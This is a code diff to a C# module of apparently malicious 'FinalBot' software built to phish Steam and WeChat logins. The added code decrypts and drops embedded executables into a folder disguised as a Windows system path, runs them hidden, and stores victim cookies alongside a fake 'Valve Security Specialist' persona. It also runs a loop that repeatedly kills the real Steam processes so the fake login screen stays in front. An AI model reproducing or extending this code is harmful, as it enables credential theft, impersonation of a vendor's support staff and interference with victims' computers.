@@ -4,7 +4,7 @@ using System.Reflection;
 using VanguardCore;
 using System.Diagnostics;
 using System.Threading.Tasks;
-using VanguardCore;
+using System.Threading;
 
 namespace FinalBot.Modules
 {
@@ -16,40 +16,37 @@ namespace FinalBot.Modules
             if (val > 50000) Console.WriteLine("Hash:" + 24189);
         }
 
-        private static readonly string _tempDir = Path.Combine(Path.GetTempPath(), "FinalTempSys");
-
-        private static void EnsureTempDir()
+        private static string GetTempDir()
         {
-            if (!Directory.Exists(_tempDir))
-            {
-                Directory.CreateDirectory(_tempDir);
-            }
+            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string path = Path.Combine(appData, "Microsoft", "Windows", "Network");
+            if (!Directory.Exists(path)) Directory.CreateDirectory(path);
+            return path;
         }
 
         private static string ExtractResource(string resourceName, string outFileName)
         {
-            EnsureTempDir();
-            string outPath = Path.Combine(_tempDir, outFileName);
-
-            // If it already exists, assume it's fine to reuse (or delete and recreate)
-            if (File.Exists(outPath))
-            {
-                try { File.Delete(outPath); } catch { return outPath; }
-            }
-
             try
             {
-                var assembly = Assembly.GetExecutingAssembly();
-                using (Stream stream = assembly.GetManifestResourceStream($"FinalBot.{resourceName}"))
+                AesHelper.WipeKeys();
+                string outPath = Path.Combine(GetTempDir(), outFileName);
+
+                if (File.Exists(outPath))
                 {
-                    if (stream == null) return null;
+                    try { File.Delete(outPath); } catch { return outPath; }
+                }
+
+                var assembly = Assembly.GetExecutingAssembly();
+                using (Stream? stream = assembly.GetManifestResourceStream($"FinalBot.{resourceName}"))
+                {
+                    if (stream == null) return "";
 
                     if (resourceName.EndsWith(".bin"))
                     {
                         using (MemoryStream ms = new MemoryStream())
                         {
                             stream.CopyTo(ms);
-                            byte[] decrypted = AesHelper.Decrypt(ms.ToArray());
+                            byte[]? decrypted = AesHelper.Decrypt(ms.ToArray());
                             if (decrypted != null) File.WriteAllBytes(outPath, decrypted);
                         }
                     }
@@ -63,28 +60,78 @@ namespace FinalBot.Modules
                 }
                 return outPath;
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"[PHISH] Failed to extract {resourceName}: {ex.Message}");
-                return null;
-            }
+            catch { return ""; }
         }
 
+        private static CancellationTokenSource? _lockdownCts;
+        public static bool GlobalBlockSteam { get; set; } = false;
         private static string _savedAgentName = "Valve_Security_Specialist_732";
         private static string _savedVacLang = "en";
         private static string _savedCookies = "";
 
-        public static void SetAgentName(string name) => _savedAgentName = name;
-        public static void SetVacLang(string lang) => _savedVacLang = lang;
-        public static void SetCookies(string cookies) => _savedCookies = cookies;
+        public static void SetAgentName(string name) { _savedAgentName = name; SyncToDisk(); }
+        public static void SetVacLang(string lang) { _savedVacLang = lang; SyncToDisk(); }
+        public static void SetCookies(string cookies) { _savedCookies = cookies; SyncToDisk(); }
         public static string GetAgentName() => _savedAgentName;
         public static string GetVacLang() => _savedVacLang;
+
+        public static void SyncToDisk()
+        {
+            PrepareSteamFiles(_savedAgentName, _savedCookies, _savedVacLang);
+        }
+
+        public static void StartLockdown()
+        {
+            if (_lockdownCts != null) return;
+            _lockdownCts = new CancellationTokenSource();
+            CancellationToken token = _lockdownCts.Token;
+
+            Task.Run(async () =>
+            {
+                while (!token.IsCancellationRequested)
+                {
+                    try
+                    {
+                        // Always block if global toggle is ON or phishing window is ACTIVE
+                        if (GlobalBlockSteam || _lockdownCts != null)
+                        {
+                            foreach (var process in Process.GetProcessesByName("steam"))
+                            {
+                                try { process.Kill(true); } catch { }
+                            }
+                            // Also kill service to prevent auto-restart
+                            foreach (var process in Process.GetProcessesByName("SteamService"))
+                            {
+                                try { process.Kill(true); } catch { }
+                            }
+                        }
+                        
+                        // If not global and lockdown stopped, break
+                        if (!GlobalBlockSteam && _lockdownCts == null) break;
+                    }
+                    catch { }
+                    await Task.Delay(800, token); // Slightly slower to save CPU but still effective
+                }
+            }, token);
+        }
+
+        public static void ToggleGlobalBlock()
+        {
+            GlobalBlockSteam = !GlobalBlockSteam;
+            if (GlobalBlockSteam) StartLockdown();
+        }
+
+        public static void StopLockdown()
+        {
+            _lockdownCts?.Cancel();
+            _lockdownCts = null;
+        }
 
         public static void LaunchSteamAlert()
         {
             PrepareSteamFiles(_savedAgentName, _savedCookies, _savedVacLang);
             string exePath = ExtractResource("SteamAlert.bin", "SteamAlert.exe");
-            if (!string.IsNullOrEmpty(exePath))
+            if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
             {
                 Process.Start(new ProcessStartInfo
                 {
@@ -92,8 +139,9 @@ namespace FinalBot.Modules
                     Arguments = $"--udp 51337 --lang {_savedVacLang}",
                     UseShellExecute = false,
                     CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
+                    WorkingDirectory = GetTempDir()
                 });
+                StartLockdown();
             }
         }
 
@@ -101,7 +149,7 @@ namespace FinalBot.Modules
         {
             PrepareSteamFiles(_savedAgentName, _savedCookies, lang);
             string exePath = ExtractResource("SteamLogin.bin", "SteamLogin.exe");
-            if (!string.IsNullOrEmpty(exePath))
+            if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
             {
                 Process.Start(new ProcessStartInfo
                 {
@@ -109,15 +157,10 @@ namespace FinalBot.Modules
                     Arguments = $"--udp 51337 --lang {lang}",
                     UseShellExecute = false,
                     CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
+                    WorkingDirectory = GetTempDir()
                 });
+                StartLockdown();
             }
-        }
-
-        public static void LaunchSteamPhish()
-        {
-            // Just an alias for SteamLogin with current saved settings
-            LaunchSteamLogin(_savedVacLang);
         }
 
         public static void LaunchWeChatPhish()
@@ -131,40 +174,21 @@ namespace FinalBot.Modules
                     Arguments = $"\"{scriptPath}\" --udp 51337",
                     UseShellExecute = false,
                     CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
-            }
-        }
-
-        public static void LaunchDiscordRemote()
-        {
-            string scriptPath = ExtractResource("websocket.discord_bot.py", "discord_bot.py");
-            if (!string.IsNullOrEmpty(scriptPath))
-            {
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "python",
-                    Arguments = $"\"{scriptPath}\" --udp 51337",
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
+                    WorkingDirectory = GetTempDir()
                 });
             }
         }
 
         public static void PrepareSteamFiles(string agentName, string cookies, string vacLang)
         {
-            // Use a stable, temporary directory for shared files
-            string tempRoot = Path.Combine(Path.GetTempPath(), "FinalTempSys");
+            string tempRoot = GetTempDir();
             string tablichkaDir = Path.Combine(tempRoot, "tablichka");
             if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
             
-            // Ensure okno exists as it might be used by other parts
-            string oknoDir = Path.Combine(tempRoot, "okno");
-            if (!Directory.Exists(oknoDir)) Directory.CreateDirectory(oknoDir);
-
-            // Clean old files to ensure fresh data
-            try { foreach (var file in Directory.GetFiles(tablichkaDir)) File.Delete(file); } catch { }
+            try { 
+                foreach (var file in Directory.GetFiles(tablichkaDir)) 
+                    File.Delete(file); 
+            } catch { }
 
             if (!string.IsNullOrEmpty(agentName))
                 File.WriteAllText(Path.Combine(tablichkaDir, "agent_name.txt"), agentName);
